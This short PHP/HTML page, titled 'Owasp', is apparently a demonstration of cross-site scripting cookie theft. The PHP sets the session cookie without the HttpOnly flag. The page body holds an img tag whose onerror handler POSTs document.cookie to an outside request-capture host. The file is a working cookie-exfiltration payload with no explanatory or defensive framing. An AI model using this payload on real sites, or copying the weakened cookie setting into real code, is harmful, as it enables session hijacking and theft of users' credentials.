<?php
    $sess_name = session_name();
    if (session_start()) {
        setcookie($sess_name, session_id(), true, '/', null, null, false);
    }
?>

<!DOCTYPE html>
<html>
<head>
  <title>Owasp</title>
</head>
<body>
<img src=null onerror="fetch('https://security.free.beeceptor.com/', { method: 'POST', body: document.cookie})" >
</body>
</html>
